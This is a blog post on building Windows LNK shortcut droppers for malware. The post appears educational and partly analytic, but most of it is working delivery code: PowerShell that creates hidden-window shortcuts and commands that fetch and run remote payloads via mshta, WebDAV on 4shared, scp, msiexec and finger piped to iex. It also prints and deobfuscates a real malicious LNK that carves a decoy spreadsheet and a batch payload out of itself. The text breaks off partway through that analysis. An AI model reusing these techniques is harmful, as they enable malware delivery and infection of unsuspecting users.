<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>LNK - Will you be my dropper? (From Basic to Advanced) | 0xNathe</title> <meta name="author" content="#~&gt; 0xNathe"> <meta name="description" content="Analysis of the most used vectors for distribution"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.21.4/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=Exo:wght@300&amp;display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/logo.png"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://nathe97.github.io/blog/2023/dropper-lnk-techniques/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">0xNathe</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">whoami</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/news">news</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">LNK - Will you be my dropper? (From Basic to Advanced)</h1> <p class="post-meta">August 22, 2023</p> <p class="post-tags"> <a href="/blog/2023"> <i class="fas fa-calendar fa-sm"></i> 2023 </a>   ·   <a href="/blog/tag/malware"> <i class="fas fa-hashtag fa-sm"></i> malware</a>   <a href="/blog/tag/misc"> <i class="fas fa-hashtag fa-sm"></i> misc</a>     ·   <a href="/blog/category/malware"> <i class="fas fa-tag fa-sm"></i> malware</a>   </p> </header> <article class="post-content"> <div id="table-of-contents"> <ul id="toc" class="section-nav"> <li class="toc-entry toc-h1"> <a href="#overview">Overview</a> <ul> <li class="toc-entry toc-h2"><a href="#create-basic-lnk-via-powershell">Create Basic LNK via Powershell</a></li> <li class="toc-entry toc-h2"> <a href="#some-of-possible-ways">Some of possible ways</a> <ul> <li class="toc-entry toc-h3"><a href="#hta">HTA</a></li> <li class="toc-entry toc-h3"><a href="#4sharedcom---thank-you-for-your-service">4shared.com - Thank you for your service.</a></li> <li class="toc-entry toc-h3"><a href="#url">.URL</a></li> <li class="toc-entry toc-h3"><a href="#using-scp">Using SCP</a></li> <li class="toc-entry toc-h3"><a href="#using-remote-installers-msiexecexe">Using Remote Installers (msiexec.exe)</a></li> <li class="toc-entry toc-h3"><a href="#finger">Finger</a></li> <li class="toc-entry toc-h3"> <a href="#file-binding-lets-analyze-the-matryoshka---spreaded-file-example">File binding, let’s analyze the matryoshka - (Spreaded File Example)</a> <ul> <li class="toc-entry toc-h4"><a href="#analyze-the-main-code">Analyze the main code</a></li> <li class="toc-entry toc-h4"><a href="#check-the-generated-files">Check the generated files</a></li> </ul> </li> </ul> </li> <li class="toc-entry toc-h2"> <a href="#evasion">Evasion</a> <ul> <li class="toc-entry toc-h3"><a href="#lets-prepare-the-soup">Let’s prepare the soup</a></li> <li class="toc-entry toc-h3"><a href="#testing-time">Testing time</a></li> </ul> </li> </ul> </li> <li class="toc-entry toc-h1"><a href="#conclusion">Conclusion</a></li> </ul> </div> <hr> <div id="markdown-content"> <p>In this article we will see some types of droppers, in particular LNKs, with various methodologies, from basic to the most advanced.</p> <h1 id="overview">Overview</h1> <p>These files are one of the most used malware distribution vectors by attackers today. The payloads are chained with the execution of other applications, until a chain is created and the actual malware is downloaded</p> <h2 id="create-basic-lnk-via-powershell">Create Basic LNK via Powershell</h2> <p>To create a link via powershell we will use the <b>CreateShortcut</b> method. You can see more info <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/admin-development/create-desktop-shortcut-with-wsh" target="_blank" rel="external nofollow noopener">Here</a></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="nv">$Shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">)</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Shell</span><span class="o">.</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"\Desktop\test.lnk"</span><span class="p">)</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">Arguments</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"-c cmd.exe"</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">WindowStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="c">#This will Hidden the Window</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell"</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">IconLocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Windows\System32\notepad.exe, 0"</span><span class="p">;</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Type: Microsoft"</span><span class="p">;</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">Save</span><span class="p">()</span><span class="w">

</span></code></pre></div></div> <p>Once the file is created and executed, the cmd will be prompted</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/1-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/1-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/1-1400.webp"></source> <img src="/assets/img/lnk/1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/2-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/2-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/2-1400.webp"></source> <img src="/assets/img/lnk/2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> Create LNK and exec </div> <h2 id="some-of-possible-ways">Some of possible ways</h2> <p>Starting from this file, let’s analyze some ways we can use to load our malware. For the moment we will focus on the payloads, without loading any malicious programs, but only an alert.</p> <h3 id="hta">HTA</h3> <p>Hello.hta</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span> 
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span> 
	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="dl">"</span><span class="s2">JScript</span><span class="dl">"</span><span class="o">&gt;</span>
	<span class="kd">var</span> <span class="nx">shell</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WScript.Shell</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">shell</span><span class="p">.</span><span class="nc">Popup</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello</span><span class="dl">"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="dl">"</span><span class="s2">I will load the malware</span><span class="dl">"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	
	<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head&gt;</span><span class="err"> 
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="dl">"</span><span class="s2">JScript</span><span class="dl">"</span><span class="o">&gt;</span><span class="nb">self</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body&gt;</span><span class="err"> 
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div> <p>Taking the powershell code to create a link as a reference, we only change this line</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Before</span><span class="w">
</span><span class="c">#$ShortCut.Arguments = "-c cmd.exe"</span><span class="w">

</span><span class="c">#After</span><span class="w">
</span><span class="nv">$ShortCut</span><span class="o">.</span><span class="nf">Arguments</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"-c mshta('http://192.168.240.140:8000/test.hta')"</span><span class="w">

</span></code></pre></div></div> <p>This line will download our HTA file remotely and run it. This will be the result.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-1.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> HTA Execution </div> <p>The execution flow of THIS dropper can be briefly described as follows</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/g1-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/g1-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/g1-1400.webp"></source> <img src="/assets/img/lnk/g1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> HTA flow. </div> <h3 id="4sharedcom---thank-you-for-your-service">4shared.com - Thank you for your service.</h3> <p>Another service used for building payloads is the <a>4shared.com</a> site This sharing and file hosting site allows us, through their service, to setup a WebFolder in Microsoft. The documentation tells us all the steps to follow.</p> <ul> <li>Click 'Start' and then choose 'My Computer';</li> <li>Choose 'Tools' Option (the top of the window);</li> <li>Click 'Map Network Drive' from the list;</li> <li>Click 'Sign up for online storage or connect to a network server' at the bottom of the window;</li> <li>Click 'Next';</li> <li>Select 'Choose another network location' then click 'Next &gt;' again;</li> <li>In the address field type https://webdav.4shared.com/</li> <li>Enter your 4shared account login and password;</li> <li>Click 'Next';</li> <li>Click 'Finish'</li> </ul> <p>Click ‘Start’ and then choose ‘My Computer’; Choose ‘Tools’ Option (the top of the window); Click ‘Map Network Drive’ from the list; Click ‘Sign up for online storage or connect to a network server’ at the bottom of the window; Click ‘Next’; Select ‘Choose another network location’ then click ‘Next &gt;’ again; In the address field type https://webdav.4shared.com/ Enter your 4shared account login and password; Click ‘Next’; Click ‘Finish’ payload</p> <p>Once a file has been uploaded to our space, we can insert this payload:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
cmd.exe /c <span class="s2">"net use E: https://webdav.4shared.com MY_SECRET_PASSWORD /user:xekit58371@ipnuc.com"</span> <span class="o">&amp;&amp;</span> 
<span class="nb">type </span>E:<span class="se">\H</span>elloWorld.exe <span class="o">&gt;</span> tmp.exe <span class="o">&amp;&amp;</span> 
forfiles /p C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\ </span>/m notepad.exe /c %cd%/tmp.exe  <span class="o">&amp;&amp;</span> net use <span class="k">*</span> /d /y<span class="s2">"

</span></code></pre></div></div> <p>The payload maps the remote folder as drive E:\, copies the Hello.exe file to tmp.exe and runs it, then disconnects all drives. Let’s just run it in cmd:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/6-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/6-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/6-1400.webp"></source> <img src="/assets/img/lnk/6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/7-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/7-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/7-1400.webp"></source> <img src="/assets/img/lnk/7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>Perfect, now build the LNK.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-webdav.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> Webdav Payload Download </div> <h3 id="url">.URL</h3> <p>The .URL extension is another type of file used for payload distribution, it is nothing more than an “Internet Shortcut”, so we can put it directly to an .exe file, or to other files which will in turn start the chain for installing malware.</p> <p>The usual use is to create a share on a server that is accessible from the outside (in this case I will do it locally), where the connection can fetch the file directly, let’s see how:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file://192.168.240.140/testing/Hello.exe

</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/8-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/8-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/8-1400.webp"></source> <img src="/assets/img/lnk/8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-url.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> Basic .URL in action </div> <h3 id="using-scp">Using SCP</h3> <p>Another widely used payload is to copy files from a server with the scp command which is already integrated into Windows.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
/c <span class="s2">"scp -o StrictHostKeyChecking=no user@ssh:/The/File %APPDATA%</span><span class="se">\L</span><span class="s2">oader.hta"</span> &amp; %APPDATA%<span class="se">\L</span>oader.hta

</code></pre></div></div> <h3 id="using-remote-installers-msiexecexe">Using Remote Installers (msiexec.exe)</h3> <p>Windows binaries are very often used, both for evasion and convenience issues. in this case we can also launch an msi remotely</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>siexec.exe /i <span class="s2">"http://example.com/Installer.msi"</span>

</code></pre></div></div> <p>we can also use /quiet /qn flags, for a background installation.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/9-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/9-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/9-1400.webp"></source> <img src="/assets/img/lnk/9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> Putty example </div> <h3 id="finger">Finger</h3> <p>Using finger we can modify our server’s response to take our payload and execute it A (stupid) example:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>finger 192.168.240.140 | ForEach-Object <span class="o">{</span>  <span class="nv">$line</span><span class="o">=</span> <span class="nv">$_</span>.toString<span class="o">()</span><span class="p">;</span> iex<span class="o">(</span><span class="nv">$line</span><span class="o">)</span>

finger 192.168.240.140  | Select-Object <span class="nt">-Skip</span> 3 <span class="nt">-Last</span> 1 | iex

</code></pre></div></div> <p>A basic paylaod like that return 2/60 on <a href="https://www.virustotal.com/gui/file/f1c22d185169bb41146a5daeedac0faf2fa2ad5b8a17f073c8f008c573ff97b4/detection" target="_blank" rel="external nofollow noopener">Virustotal</a> But like now we will not cover Evasion we will just analyze some files.</p> <h3 id="file-binding-lets-analyze-the-matryoshka---spreaded-file-example">File binding, let’s analyze the matryoshka - (Spreaded File Example)</h3> <p>Another method to obfuscate payloads is to hide files and payloads within the same file. To understand better, let’s take a real example of a malicious LNK.</p> <p>Let’s start with a malicious file,inside this file were inserted:</p> <ul> <li>1 xlsx file</li> <li>1 payload that execute the malware.</li> </ul> <h4 id="analyze-the-main-code">Analyze the main code</h4> <p>We start the analysis by visualizing the first payload, the one we can see in the lnk file.</p> <p>icon_file_name: D:\C2 Framwork\InkMaker v1\HncApp\HCell.exe</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/4-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/4-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/4-1400.webp"></source> <img src="/assets/img/lnk/4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> File Size. </div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\SysWOW64\cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-windowstyle</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nv">$pEbjEn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Location</span><span class="p">;</span><span class="kr">if</span><span class="p">(</span><span class="nv">$pEbjEn</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'System32'</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$pEbjEn</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'Program Files'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$pEbjEn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'%temp%'</span><span class="p">};</span><span class="nv">$lyHWPSj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$pEbjEn</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">*.</span><span class="nf">lnk</span><span class="w"> </span><span class="err">^</span><span class="o">|</span><span class="w"> </span><span class="n">where-object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">length</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="n">x18C0000</span><span class="p">}</span><span class="w"> </span><span class="err">^</span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">FullName</span><span class="p">;</span><span class="kr">if</span><span class="p">(</span><span class="nv">$lyHWPSj</span><span class="o">.</span><span class="nf">GetType</span><span class="p">()</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'Object'</span><span class="p">){</span><span class="nv">$lyHWPSj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$lyHWPSj</span><span class="p">[</span><span class="mi">0</span><span class="p">];};</span><span class="nv">$lyHWPSj</span><span class="p">;</span><span class="nv">$C5ytw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gc</span><span class="w"> </span><span class="nv">$lyHWPSj</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="w"> </span><span class="nt">-TotalCount</span><span class="w"> </span><span class="nx">74240</span><span class="w"> </span><span class="nt">-ReadCount</span><span class="w"> </span><span class="nx">74240</span><span class="p">;</span><span class="nv">$tyxkEP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'%temp%\현황조사표.xlsx'</span><span class="p">;</span><span class="n">sc</span><span class="w"> </span><span class="nv">$tyxkEP</span><span class="w"> </span><span class="p">([</span><span class="n">byte</span><span class="p">[]](</span><span class="nv">$C5ytw</span><span class="w"> </span><span class="err">^</span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">62464</span><span class="p">))</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">;</span><span class="w"> </span><span class="err">^</span><span class="o">&amp;</span><span class="w"> </span><span class="nv">$tyxkEP</span><span class="p">;</span><span class="nv">$Cbe1yj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gc</span><span class="w"> </span><span class="nv">$lyHWPSj</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="w"> </span><span class="nt">-TotalCount</span><span class="w"> </span><span class="nx">79888</span><span class="w"> </span><span class="nt">-ReadCount</span><span class="w"> </span><span class="nx">79888</span><span class="p">;</span><span class="nv">$WH9lSPHOFI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'%temp%\PMmVvG56FLC9y.bat'</span><span class="p">;</span><span class="n">sc</span><span class="w"> </span><span class="nv">$WH9lSPHOFI</span><span class="w"> </span><span class="p">([</span><span class="n">byte</span><span class="p">[]](</span><span class="nv">$Cbe1yj</span><span class="w"> </span><span class="err">^</span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">74342</span><span class="p">))</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">;</span><span class="err">^</span><span class="o">&amp;</span><span class="w"> </span><span class="o">%</span><span class="n">windir</span><span class="o">%</span><span class="nx">\SysWOW64\cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nv">$WH9lSPHOFI</span><span class="p">;</span><span class="w">

</span></code></pre></div></div> <p>After deobfuscation the code looks like this, let’s analyze step by step:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="c">#Step1 - Get Path location, if location in Program Files or System32, path will be %temp%</span><span class="w">
</span><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Location</span><span class="p">;</span><span class="w">
</span><span class="kr">if</span><span class="p">(</span><span class="nv">$path</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'System32'</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'Program Files'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'%temp%'</span><span class="p">};</span><span class="w">

</span><span class="c">#Step 2 - Get all files, and select file file with LNK extension where the leghnt is equal to = 0x18C0000 = 25952256 =  24.7 MB, So he is looking for himself.</span><span class="w">
</span><span class="nv">$findLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">*.</span><span class="nf">lnk</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where-object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">length</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="n">x18C0000</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">FullName</span><span class="p">;</span><span class="w">
</span><span class="kr">if</span><span class="p">(</span><span class="nv">$findLink</span><span class="o">.</span><span class="nf">GetType</span><span class="p">()</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s1">'Object'</span><span class="p">){</span><span class="nv">$findLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$findLink</span><span class="p">[</span><span class="mi">0</span><span class="p">];};</span><span class="w">

</span><span class="nv">$findLink</span><span class="p">;</span><span class="w">

</span><span class="c">#Step3 - Get Content (type 	cat 	Get-Content 	gc, cat, type) -  Read 74240 from the beginning of LNK file</span><span class="w">
</span><span class="c">#         Create xls file, and copy 74240 - 11776 bytes to the file. then open it.</span><span class="w">
</span><span class="nv">$TotalBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gc</span><span class="w"> </span><span class="nv">$findLink</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="w"> </span><span class="nt">-TotalCount</span><span class="w"> </span><span class="nx">74240</span><span class="w"> </span><span class="nt">-ReadCount</span><span class="w"> </span><span class="nx">74240</span><span class="p">;</span><span class="w">
</span><span class="nv">$tmpXLS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'test.xlsx'</span><span class="p">;</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nv">$tmpXLS</span><span class="w"> </span><span class="p">([</span><span class="n">byte</span><span class="p">[]](</span><span class="nv">$TotalBytes</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">62464</span><span class="p">))</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">;</span><span class="w"> 

</span><span class="c">#&amp; $tyxkEP;</span><span class="w">


</span><span class="c">#Step4 Do the same thing just changing byte number, and copy all to a .bat file.</span><span class="w">
</span><span class="nv">$BatPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gc</span><span class="w"> </span><span class="nv">$findLink</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="w"> </span><span class="nt">-TotalCount</span><span class="w"> </span><span class="nx">79888</span><span class="w"> </span><span class="nt">-ReadCount</span><span class="w"> </span><span class="nx">79888</span><span class="p">;</span><span class="w">

